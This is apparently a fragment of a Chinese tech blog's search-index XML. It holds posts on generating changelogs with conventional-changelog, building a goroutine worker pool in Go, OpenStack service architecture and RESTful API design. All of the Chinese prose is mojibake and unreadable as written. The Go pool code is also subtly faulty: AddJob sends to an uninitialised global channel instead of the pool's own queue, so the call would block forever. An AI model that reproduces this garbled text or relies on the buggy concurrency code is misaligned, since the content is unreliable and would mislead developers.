logï¼Œåªä¼šåœ¨CHANGELOG.mdçš„å¤´éƒ¨åŠ ä¸Šè‡ªä»ä¸Šæ¬¡å‘å¸ƒä»¥æ¥çš„å˜åŠ¨ã€‚å¦‚æœä½ æƒ³ç”Ÿæˆæ‰€æœ‰å‘å¸ƒçš„ Change logï¼Œè¦æ”¹ä¸ºè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯ä»¥å°†å…¶å†™å…¥package.jsonçš„scriptså­—æ®µã€‚1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; ä»¥åï¼Œç›´æ¥è¿è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ã€‚1$ npm run changelog]]></content>
      <categories>
        <category>å¼€å‘å·¥å…·</category>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Golangå¹¶å‘ç¼–ç¨‹-åç¨‹æ± ]]></title>
    <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
    <content type="text"><![CDATA[åœ¨æœ€è¿‘å¼€å‘çš„é¡¹ç›®ä¸­ï¼Œåç«¯éœ€è¦ç¼–å†™è®¸å¤šæä¾›HTTPæ¥å£çš„APIï¼Œä¹‹æ‰€ä»¥é€‰æ‹©Golangï¼Œä¸»è¦æ˜¯è€ƒè™‘åˆ°å¼€å‘çš„æ¨¡å—ï¼Œéƒ½éœ€è¦æ¥å—ç¬æ—¶å¤§å¹¶å‘ã€ã€CPUå¯†é›†å‹çš„åˆ†æä»»åŠ¡ã€å¤„ç†æ—¶é—´è¾ƒé•¿ã€æ— æ³•åŒæ­¥ç«‹å³è¿”å›ç»“æœçš„åœºæ™¯ï¼ŒGolangçš„goroutineä»¥åŠchannelæ‰€æä¾›çš„è¯­è¨€å±‚çº§çš„ç‰¹æ€§ï¼Œæ­£å¥½å¯ä»¥æ»¡è¶³è¿™æ–¹é¢çš„éœ€è¦ å¦‚ä½•é«˜å¹¶å‘å¹¶å‘æ¨¡å¼ä¸‹æœ‰å¾ˆå¤šé—®é¢˜éœ€è¦æˆ‘ä»¬å…³æ³¨, å› æ­¤æˆ‘ä»¬è®¾è®¡å‡ºæ¥çš„goroutine poolåº”è¯¥å…³æ³¨å¦‚ä¸‹ä¸€äº›é—®é¢˜ goroutineçš„é«˜å¹¶å‘goroutineçš„ä¸€ä¸ªä¸»è¦ç‰¹æ€§å°±æ˜¯å®ƒä»¬çš„æ¶ˆè€—ï¼›åˆ›å»ºå®ƒä»¬çš„åˆå§‹å†…å­˜æˆæœ¬å¾ˆä½(ä¸éœ€è¦1è‡³8MBå†…å­˜çš„ä¼ ç»ŸPOSIXçº¿ç¨‹å½¢æˆé²œæ˜å¯¹æ¯”)ä»¥åŠæ ¹æ®éœ€è¦åŠ¨æ€å¢é•¿å’Œç¼©å‡å ç”¨çš„èµ„æºã€‚è¿™ä½¿å¾—goroutineä¼šä»4096å­—èŠ‚çš„åˆå§‹æ ˆå†…å­˜å ç”¨å¼€å§‹æŒ‰éœ€å¢é•¿æˆ–ç¼©å‡å†…å­˜å ç”¨, åœ¨ä¸€èˆ¬çš„éœ€æ±‚ä¸‹, æˆ‘ä»¬æ— éœ€æ‹…å¿ƒèµ„æºçš„è€—å°½ã€‚ Goè¯­è¨€é€šè¿‡ç³»ç»Ÿçš„çº¿ç¨‹æ¥å¤šè·¯æ´¾é£è¿™äº›å‡½æ•°çš„æ‰§è¡Œï¼Œä½¿å¾—æ¯ä¸ªç”¨goå…³é”®å­—æ‰§è¡Œçš„å‡½æ•°å¯ä»¥è¿è¡Œæˆä¸ºä¸€ä¸ªå•ä½åç¨‹ã€‚å½“ä¸€ä¸ªåç¨‹é˜»å¡çš„æ—¶å€™ï¼Œè°ƒåº¦å™¨å°±ä¼šè‡ªåŠ¨æŠŠå…¶ä»–åç¨‹å®‰æ’åˆ°å¦å¤–çš„çº¿ç¨‹ä¸­å»æ‰§è¡Œï¼Œä»è€Œå®ç°äº†ç¨‹åºæ— ç­‰å¾…å¹¶è¡ŒåŒ–è¿è¡Œã€‚è€Œä¸”è°ƒåº¦çš„å¼€é”€éå¸¸å°ï¼Œä¸€é¢—CPUè°ƒåº¦çš„è§„æ¨¡ä¸ä¸‹äºæ¯ç§’ç™¾ä¸‡æ¬¡ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºå¤§é‡çš„goroutineï¼Œä»è€Œå¯ä»¥å¾ˆè½»æ¾åœ°ç¼–å†™é«˜å¹¶å‘ç¨‹åºï¼Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ ç®€å•æ¥è¯´ï¼šåç¨‹ååˆ†è½»é‡ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­æ‰§è¡Œæœ‰æ•°ä»¥åä¸‡è®¡çš„åç¨‹ï¼Œä¾æ—§ä¿æŒé«˜æ€§èƒ½ã€‚ å› æ­¤æˆ‘ä»¬ä½¿ç”¨goroutineå¤„ç†ä»»åŠ¡, å¤§æ¦‚æ¨¡å‹ä¸ºï¼š1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //å¼€ä¸€ä¸ªæ–°çš„Goroutinesæ‰§è¡Œ &#125; time.Sleep(time.Second * 1) // ç­‰å¾…goroutineè·‘å®Œ, æˆ‘ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨äº†sleepçš„æ–¹å¼&#125; åˆ©ç”¨ååºæ± åšå¹¶å‘æ§åˆ¶è™½ç„¶goroutineå¾ˆä¾¿å®œ, ä½†ä¹Ÿä¸æ˜¯å…è´¹çš„, æ€»æœ‰ä¸€ä¸ªæ—¶å€™ä½ ç³»ç»Ÿä¼šæ‰›ä¸ä½ï¼Œæˆ‘ä»¬ä¸èƒ½å¤©çœŸçš„å¯¹goroutineçš„æ•°é‡ä¸åŠ é™åˆ¶çš„ä½¿ç”¨, å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§å¹¶å‘çš„é™åˆ¶æœºåˆ¶æ¥ä¿è¯ç¨‹åºçš„ç¨³å®š, ä½¿å¾—ç¨‹åºä¸ä¼šå› ä¸ºè¿‡å¤šçš„goroutineè€Œå´©æºƒ, è‡³äºå¤šå°‘ä¸ªgoroutine å°±éœ€è¦æ ¹æ®è‡ªå·±ç¯å¢ƒæµ‹è¯•å¾—å‡ºã€‚ å¦‚ä½•å¯¹goroutineåšå¹¶å‘é™åˆ¶å–ƒï¼Ÿä½¿ç”¨Javaå’ŒCæ¦‚å¿µä¸­çš„çº¿ç¨‹æ± æ¥å¤„ç†æ˜¯ä¸ªä¸é”™çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨Channelå®ç°Queue+Workeræ¨¡å‹, æ•´ä¸ªè¿‡ç¨‹ï¼šå°†è¯·æ±‚éƒ½è½¬å‘ç»™ä¸€ä¸ªchannelï¼Œç„¶ååˆå§‹åŒ–å¤šä¸ªgoroutineè¯»å–è¿™ä¸ªchannelä¸­çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ é¿å…æ¥æ”¶Channelé˜»å¡å¦‚æœchannelåˆå§‹åŒ–æ—¶æ˜¯æ²¡æœ‰è®¾ç½®é•¿åº¦çš„ï¼Œæ­¤æ—¶å¦‚æœååºæ± éƒ½æ»¡è´Ÿè·å·¥ä½œï¼Œå†æœ‰è¯·æ±‚è¿‡æ¥çš„è¯ï¼Œä»ç„¶ä¼šå‡ºç°è¢«blockçš„æƒ…å†µï¼Œè€Œä¸”ä¼šæ¯”æ²¡æœ‰ç»è¿‡ä¼˜åŒ–çš„æ–¹æ¡ˆè¿˜è¦æ…¢ é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥å¸Œæœ›æ¨¡å—èƒ½å¤ŸåŠæ—¶å‘ŠçŸ¥è°ƒç”¨æ–¹ï¼Œâ€œæˆ‘å·²ç»è¾¾åˆ°å¤„ç†æé™äº†ï¼Œæ— æ³•ç»™ä½ å¤„ç†è¯·æ±‚äº†â€ã€‚å…¶å®ï¼Œè¿™ç§éœ€æ±‚ï¼Œå¯ä»¥å¾ˆç®€å•çš„åœ¨Golangä¸­å®ç°ï¼šå¦‚æœchannelå‘é€ä»¥åŠæ¥æ”¶æ“ä½œåœ¨selectè¯­å¥ä¸­æ‰§è¡Œå¹¶ä¸”å‘ç”Ÿé˜»å¡ï¼Œdefaultè¯­å¥å°±ä¼šç«‹å³æ‰§è¡Œã€‚ æ¥æ”¶æ‰§è¡Œç»“æœæˆ‘ä»¬æ—¢éœ€è¦æŠŠç»“æœå‘é€ç»™æŸä¸ªchannelï¼Œè·å–åˆ°å¤„ç†è¿™æ¬¡è¯·æ±‚çš„ç»“æœã€‚è§£å†³çš„æ–¹æ³•æ˜¯ï¼šå°†ä¸€ä¸ªchannelå®ä¾‹åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œgoroutineå¤„ç†å®Œæˆåå°†ç»“æœå†™å›è¿™ä¸ªchannel ä»»åŠ¡è¶…æ—¶æœºåˆ¶å³ä½¿æ˜¯å¤æ‚ã€è€—æ—¶çš„ä»»åŠ¡ï¼Œä¹Ÿå¿…é¡»è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚ä¸€æ–¹é¢å¯èƒ½æ˜¯ä¸šåŠ¡å¯¹æ­¤æœ‰æ—¶é™è¦æ±‚ï¼ˆç”¨æˆ·å¿…é¡»åœ¨XXåˆ†é’Ÿå†…çœ‹åˆ°ç»“æœï¼‰ï¼Œå¦ä¸€æ–¹é¢æ¨¡å—æœ¬èº«ä¹Ÿä¸èƒ½éƒ½æ¶ˆè€—åœ¨ä¸€ç›´æ— æ³•ç»“æŸçš„ä»»åŠ¡ä¸Šï¼Œä½¿å¾—å…¶ä»–è¯·æ±‚æ— æ³•å¾—åˆ°æ­£å¸¸å¤„ç†ã€‚å› æ­¤ï¼Œä¹Ÿéœ€è¦å¯¹å¤„ç†æµç¨‹å¢åŠ è¶…æ—¶æœºåˆ¶ã€‚ æˆ‘ä¸€èˆ¬è®¾ç½®è¶…æ—¶çš„æ–¹æ¡ˆæ˜¯ï¼šå’Œä¹‹å‰æåˆ°çš„â€œæ¥æ”¶å‘é€ç»™channelä¹‹åè¿”å›çš„ç»“æœâ€ç»“åˆèµ·æ¥ï¼Œåœ¨ç­‰å¾…è¿”å›channelçš„å¤–å±‚æ·»åŠ selectï¼Œå¹¶åœ¨å…¶ä¸­é€šè¿‡time.After()æ¥åˆ¤æ–­è¶…æ—¶ åç¨‹çš„ä¼˜é›…é€€å‡ºååºæ± é‡Œé¢çš„ååºæˆ‘ä»¬ä¹Ÿéœ€è¦ä¼˜é›…é€€å‡ºï¼Œè§£å†³æ–¹æ³•å¾ˆç®€å•, ç›´æ¥é€šè¿‡selectç›‘å¬ä¸€ä¸ªé€€å‡ºchannel, ç­‰å¾…å¤–éƒ¨é€šçŸ¥, å¥½ç»ˆæ­¢åç¨‹ å®ç°åç¨‹æ± æ¥ä¸‹é‡Œæˆ‘ä»¬å°†å®ç°ä¸€ä¸ªæ»¡è¶³ä¸Šè¿°éœ€æ±‚çš„Goroutine pool æµç¨‹å›¾ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; æµ‹è¯•]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>goroutine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•å¼€å‘OpenstackæœåŠ¡-å¼€ç¯‡(ä¸€)]]></title>
    <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
    <content type="text"><![CDATA[openstackæ˜¯æˆ‘è§è¿‡æœ€å¤§æœ€å¤æ‚çš„pythoné¡¹ç›®, è™½ç„¶openstacké¡¹ç›®çš„çƒ­åº¦åœ¨ä¸‹æ»‘, ä½†æ˜¯openstackè¿™å¥—å¼€å‘ç†å¿µä»»ç„¶æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œå€¼å¾—æˆ‘ä»¬å­¦ä¹ . ç”±äºå·¥ä½œéœ€è¦, æˆ‘ä¹Ÿéœ€è¦å¼€å‘ä¸€äº›è‡ªå®šä¹‰çš„openstackæœåŠ¡, å› æ­¤æƒ³å°†å¼€å‘openstackæœåŠ¡çš„è¿‡ç¨‹ä»¥ä¸€ç³»åˆ—çš„æ–‡ç« è®°å½•ä¸‹æ¥, æ–¹ä¾¿éœ€è¦çš„äººã€‚ openstackç®€ä»‹openstackæ˜¯ä¸€ä¸ªIaaSå¹³å°, æä¾›è®¡ç®—æœåŠ¡ã€ç½‘ç»œæœåŠ¡ã€å­˜å‚¨æœåŠ¡ç­‰, æœ‰3ç§æ–¹å¼ä½¿ç”¨openstackæä¾›çš„æœåŠ¡ APIé€šè¿‡APIä½¿ç”¨OpenStackçš„æ–¹å¼æ˜¯ç”±å„ä¸ªæœåŠ¡è‡ªå·±å®ç°çš„, è¿™äº›APIéƒ½æ˜¯æœ‰ç»Ÿä¸€çš„å½¢å¼çš„ï¼Œéƒ½æ˜¯é‡‡ç”¨äº†HTTPåè®®å®ç°çš„ç¬¦åˆRESTè§„èŒƒçš„APIã€‚ CLI/SDKé€šè¿‡å‘½ä»¤è¡Œæ˜¯ç”¨OpenStackæœåŠ¡çš„æ–¹å¼æ˜¯ç”±ä¸€ç³»åˆ—é¡¹ç›®æ¥æä¾›çš„ï¼Œè¿™äº›é¡¹ç›®ä¸€èˆ¬éƒ½å‘½åä¸ºpython-projectclientï¼Œæ¯”å¦‚python-keystoneclientï¼Œpython-novaclietnç­‰ã€‚è¿™äº›å‘½ä»¤è¡Œé¡¹ç›®åˆ†åˆ«å¯¹åº”åˆ°å„ä¸ªä¸»è¦çš„æœåŠ¡ï¼Œä¸ºç”¨æˆ·æä¾›å‘½ä»¤è¡Œæ“ä½œç•Œé¢å’ŒPythonçš„SDKã€‚æ¯”å¦‚python-keystoneclientå¯¹åº”åˆ°keystoneï¼Œä¸ºç”¨æˆ·æä¾›äº†keystoneè¿™ä¸ªå‘½ä»¤ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†keystoné¡¹ç›®çš„SDKï¼ˆå…¶å®æ˜¯åœ¨SDKçš„åŸºç¡€ä¸Šå®ç°äº†å‘½ä»¤è¡Œï¼‰ã€‚è¿™äº›clienté¡¹ç›®æä¾›çš„SDKå…¶å®ä¹Ÿæ˜¯å°è£…äº†å¯¹å„è‡ªæœåŠ¡çš„APIçš„è°ƒç”¨ã€‚ç”±äºæ¯ä¸ªä¸»è¦é¡¹ç›®éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç¤¾åŒºè§‰å¾—ä¸å¥½ï¼Œäºæ˜¯åˆæœ‰äº†ä¸€ä¸ªæ–°çš„é¡¹ç›®python-openstackclientï¼Œç”¨æ¥æä¾›ä¸€ä¸ªç»Ÿä¸€çš„å‘½ä»¤è¡Œå·¥å…·openstackï¼ˆå‘½ä»¤çš„åå­—å°±å«åšopenstackï¼‰ï¼Œè¿™ä¸ªå·¥å…·å®ç°äº†å‘½ä»¤è¡Œï¼Œç„¶åä½¿ç”¨å„ä¸ªæœåŠ¡çš„clienté¡¹ç›®æä¾›çš„SDKæ¥å®Œæˆå¯¹åº”çš„æ“ä½œ WebUIé€šè¿‡Webç•Œé¢ä½¿ç”¨OpenStackæœåŠ¡è¿™ç§æ–¹å¼æ˜¯é€šè¿‡OpenStackçš„Horizoné¡¹ç›®æä¾›çš„ã€‚Horizoné¡¹ç›®æ˜¯ä¸€ä¸ªDjangoåº”ç”¨ï¼Œå®ç°äº†ä¸€ä¸ªé¢æ¿åŠŸèƒ½ï¼Œæ˜¯ä¼ ç»Ÿçš„MVCå¼€å‘æ¨¡å‹, ä¸è¿‡æœ€æ–°çš„é¡¹ç›® åœ¨æ…¢æ…¢å¾€Angularä¸Šè¿ç§»ã€‚Horizoné¡¹ç›®ä¸»è¦æ˜¯æä¾›ä¸€ç§äº¤äº’ç•Œé¢ï¼Œå®ƒä¼šé€šè¿‡APIæ¥å’Œå„ä¸ªOpenStackæœåŠ¡è¿›è¡Œäº¤äº’ï¼Œç„¶ååœ¨Webç•Œé¢ä¸Šå±•ç¤ºå„ä¸ªæœåŠ¡çš„çŠ¶æ€ï¼›å®ƒä¹Ÿä¼šæ¥æ”¶ç”¨æˆ·çš„æ“ä½œï¼Œç„¶åè°ƒç”¨å„ä¸ªæœåŠ¡çš„APIæ¥å®Œæˆç”¨æˆ·å¯¹å„ä¸ªæœåŠ¡çš„ä½¿ç”¨ å› æ­¤å¼€å‘ä¸€ä¸ªå®Œæ•´çš„openstacké¡¹ç›®éœ€è¦å®Œæˆä¸Šé¢ä»‹ç»çš„3éƒ¨åˆ†çš„å¼€å‘ï¼Œå½“ç„¶APIæœåŠ¡æ˜¯æ ¹æœ¬ã€‚ openstackæ¶æ„æ•´ä¸ªopenstackçš„æœåŠ¡æ˜¯ä»¥æ’ä»¶åŒ–å¾—æ–¹å¼è¿›è¡Œç‹¬ç«‹å¼€å‘, ç„¶åé€šè¿‡APIç›¸äº’å…³è”, æ¯”å¦‚:æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šä»¥demoçš„å½¢å¼å¼€å‘ä¸€ä¸ªå’ŒopenstackæœåŠ¡ç±»ä¼¼çš„æœåŠ¡ï¼Œè¯¥æœåŠ¡çš„åç§°å°±å«demo openstackä¸­çš„apiæœåŠ¡openstackçš„APIè®¾è®¡é£æ ¼ä¸ºRESTful, å¦‚ä½•è®¾è®¡RESTful APIæˆ‘åœ¨å‰é¢çš„åšå®¢ä¸­æœ‰ä»‹ç», Pythonçš„Webå¼€å‘æ¡†æ¶å¾ˆå¤šï¼ŒåŸºæœ¬ä¸Šï¼Œè¿˜æ´»è·ƒçš„æ¡†æ¶éƒ½æ”¯æŒRESTful APIçš„å¼€å‘, æœ‰äº›æ¡†æ¶è¿˜ä¸“é—¨ä¸ºRESTful APIçš„å¼€å‘æä¾›äº†ä¾¿åˆ©çš„åŠŸèƒ½,æ¯”å¦‚Pecanï¼Œæœ‰äº›æ¡†æ¶åˆ™é€šè¿‡ç¬¬ä¸‰æ–¹æ¨¡å—æ¥æä¾›è¿™ç§ä¾¿åˆ©ï¼Œæ¯”å¦‚Djangoå’ŒFlaskéƒ½æœ‰ä¸å°‘å’ŒRESTç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ã€‚å¯¹äºæ¡†æ¶é€‰æ‹©ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¥½çš„æ ‡å‡†ï¼Œä¸€èˆ¬éƒ½æ˜¯æ¯”è¾ƒæ€§èƒ½ã€æ–‡æ¡£ã€ç¤¾åŒºæ˜¯å¦æ´»è·ƒç­‰ã€‚åœ¨æˆ‘çœ‹æ¥ï¼Œé€‰æ‹©æµè¡Œçš„ä¸€èˆ¬å°±ä¸ä¼šé”™ä¸‹é¢æ˜¯openstack keystoneå…³äºcredentialçš„API: æ—©æœŸé¡¹ç›®çš„apiæœåŠ¡OpenStacké¡¹ç›®å€¾å‘äºä¸é‡æ–°å‘æ˜è½®å­ï¼Œä¸€èˆ¬éƒ½ä¼šé€‰æ‹©ç°æœ‰çš„åº“å’Œæ¡†æ¶æ¥ä½¿ç”¨ï¼Œé™¤éç°æœ‰çš„æ¡†æ¶ä¸æ»¡è¶³éœ€æ±‚ã€‚å› ä¸ºWebæ¡†æ¶çš„é€‰æ‹©å¾ˆå¤šï¼Œè€Œä¸”éƒ½æ»¡è¶³éœ€æ±‚ï¼Œæ‰€ä»¥OpenStacké¡¹ç›®åˆ°ç›®å‰ä¸ºæ­¢éƒ½æ˜¯ä½¿ç”¨ç°æˆçš„Webæ¡†æ¶ã€‚OpenStackæ—©æœŸçš„é¡¹ç›®å¹¶æ²¡æœ‰ä½¿ç”¨ä¸€ä¸ªæ¡†æ¶ï¼Œè€Œæ˜¯ä½¿ç”¨äº†å‡ ä¸ªä¸åŒçš„æ¨¡å—æ¥ç»„åˆå‡ºä¸€ä¸ªæ¡†æ¶ï¼šPaste + PasteDeploy + Routes + WebObï¼Œè¿™å‡ ä¸ªä¸åŒçš„æ¨¡å—åˆ†åˆ«è´Ÿè´£åº”ç”¨çš„WSGIåŒ–ã€URLè·¯ç”±å’Œè¯·æ±‚å¤„ç†ç­‰åŠŸèƒ½ã€‚Nova, Glance, Neutron, Keystoneç­‰æ—©æœŸçš„é¡¹ç›®éƒ½æ˜¯ä½¿ç”¨è¿™æ ·çš„æ¶æ„æ¥å®ç°RESTful APIçš„ã€‚æ—©æœŸçš„è¿™ç§æŠ€æœ¯é€‰å‹å¸¦æ¥çš„å¥½å¤„æ˜¯â€æ¡†æ¶â€å…·å¤‡è¶³å¤Ÿçš„çµæ´»æ€§ï¼Œç¼ºç‚¹åˆ™æ˜¯è¦æŠŠè¿™å‡ ä¸ªæ¨¡å—ç»„åˆèµ·æ¥å®ç°ä¸€ä¸ªRESTæœåŠ¡ï¼Œéœ€è¦å†™å¾ˆå¤šä»£ç ï¼Œè¿WSGIçš„å…¥å£å‡½æ•°éƒ½è¦è‡ªå·±å®ç°ï¼ˆæ¯”å¦‚Keystoneé¡¹ç›®çš„keystone/common/wsgi.pyæ–‡ä»¶ä¸­çš„class Applicationï¼‰ã€‚å› ä¸ºçµæ´»æ€§çš„å¥½å¤„ä¸æ˜¯å¾ˆæ˜æ˜¾ï¼Œè€Œä»£ç é‡å¤§çš„åå¤„å¾ˆæ˜æ˜¾ï¼Œæ¯”å¦‚ä¸Šé¢é‚£ä¸ªclass Applicationéœ€è¦åœ¨æ¯ä¸ªé¡¹ç›®ä¸­å¤åˆ¶ä¸€éï¼Œæ‰€ä»¥ç¤¾åŒºçš„æ–°é¡¹ç›®å°±å¼€å§‹ä½¿ç”¨æ–°çš„Webæ¡†æ¶Pecan æ–°é¡¹ç›®çš„apiæœåŠ¡Pecanæ˜¯ä¸€ä¸ªåŸºäºå¯¹è±¡è·¯ç”±çš„æ¡†æ¶ï¼Œå³çµæ´»åˆç®€å•ã€‚Pecanä¸»è¦å®ç°äº†URLè·¯ç”±åŠŸèƒ½ï¼Œæ”¯æŒRESTful APIã€‚Pecanæ²¡æœ‰å®ç°æ¨¡æ¿ã€sessionç®¡ç†å’ŒORMç­‰åŠŸèƒ½ï¼Œä½†æ˜¯è¿™äº›åŠŸèƒ½å¯ä»¥é€šè¿‡å…¶ä»–çš„æ¨¡å—æ¥å®ç°ã€‚å¯¹äºOpenStackæ¥è¯´ï¼ŒPecanæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œå› ä¸ºOpenStacké¡¹ç›®ä¸­ç»Ÿä¸€ä½¿ç”¨sqlalchemyæ¥å®ç°ORMï¼ŒAPIçš„å®ç°ä¹Ÿä¸éœ€è¦æ¨¡æ¿åŠŸèƒ½ï¼Œå®‰å…¨æ§åˆ¶åˆ™åŸºäºKeystoneä½“ç³»ã€‚ä½¿ç”¨Pecanæ¥å¼€å‘RESTæœåŠ¡ï¼Œä»£ç é‡å¾ˆå°‘ï¼Œä»£ç ç»“æ„ä¹Ÿæ¸…æ™°ã€‚Ceilometeré¡¹ç›®å°±æ˜¯ä½¿ç”¨äº†Pecan]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API è®¾è®¡è§„èŒƒ]]></title>
    <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
    <content type="text"><![CDATA[åšå‡ºä¸€ä¸ªå¥½çš„APIè®¾è®¡å¾ˆéš¾ã€‚APIè¡¨è¾¾çš„æ˜¯ä½ çš„æ•°æ®å’Œä½ çš„æ•°æ®ä½¿ç”¨è€…ä¹‹é—´çš„å¥‘çº¦ï¼Œå› æ­¤APIçš„è®¾è®¡å¾€å¾€æ˜¯ç«™åœ¨ä½¿ç”¨è€…çš„è§’åº¦è¿›è¡Œçš„ï¼Œè€Œå…³äºRESTfulçš„ä»‹ç»å¯ä»¥å‚è€ƒé˜®ä¸€å³°çš„åšå®¢ç†è§£RESTfulæ¶æ„ , è¿™é‡ŒåŒæ—¶ä¹Ÿå‚è€ƒäº†ä»–çš„å¦ä¸€ç¯‡åšå®¢RESTful API è®¾è®¡æŒ‡å—åœ¨è¿™æ–¹é¢æœ‰ä¸€ç¯‡å¾ˆå‡ºåçš„æ–‡ç« ï¼Œè¿™é‡Œéœ€è¦ä½ è‡ªå·±è§£å†³ç¿»å¢™é—®é¢˜Principles of good RESTful API Design å®šä¹‰ è¿™é‡Œæœ‰ä¸€äº›éå¸¸é‡è¦çš„æœ¯è¯­ï¼Œæˆ‘å°†åœ¨æœ¬æ–‡é‡Œé¢ä¸€ç›´ç”¨åˆ°å®ƒä»¬ èµ„æº(Resource)ï¼šä¸€ä¸ªå¯¹è±¡çš„å•ç‹¬å®ä¾‹ï¼Œå¦‚ä¸€åªåŠ¨ç‰© é›†åˆ(Collection)ï¼šä¸€ç¾¤åŒç§å¯¹è±¡ï¼Œå¦‚åŠ¨ç‰© HTTPï¼šè·¨ç½‘ç»œçš„é€šä¿¡åè®® å®¢æˆ·ç«¯(Consumer)ï¼šå¯ä»¥åˆ›å»ºHTTPè¯·æ±‚çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ç¬¬ä¸‰æ–¹å¼€å‘è€…(Third Party Developer)ï¼šè¿™ä¸ªå¼€å‘è€…ä¸å±äºä½ çš„é¡¹ç›®ä½†æ˜¯æœ‰æƒ³ä½¿ç”¨ä½ çš„æ•°æ® æœåŠ¡å™¨(Server)ï¼šä¸€ä¸ªHTTPæœåŠ¡å™¨æˆ–è€…åº”ç”¨ç¨‹åºï¼Œå®¢æˆ·ç«¯å¯ä»¥è·¨ç½‘ç»œè®¿é—®å®ƒ ç«¯ç‚¹(Endpoint)ï¼šè¿™ä¸ªAPIåœ¨æœåŠ¡å™¨ä¸Šçš„URLç”¨äºè¡¨è¾¾ä¸€ä¸ªèµ„æºæˆ–è€…ä¸€ä¸ªé›†åˆ å¹‚ç­‰(Idempotent)ï¼šæ— è¾¹é™…æ•ˆåº”ï¼Œå¤šæ¬¡æ“ä½œå¾—åˆ°ç›¸åŒçš„ç»“æœ URLæ®µ(Segment)ï¼šåœ¨URLé‡Œé¢å·²æ–œæ åˆ†éš”çš„å†…å®¹ æ•°æ®è®¾è®¡ä¸æŠ½è±¡ ç†æ¸…ä¸šåŠ¡æ•°æ®æµç¨‹ è§„åˆ’å¥½ä½ 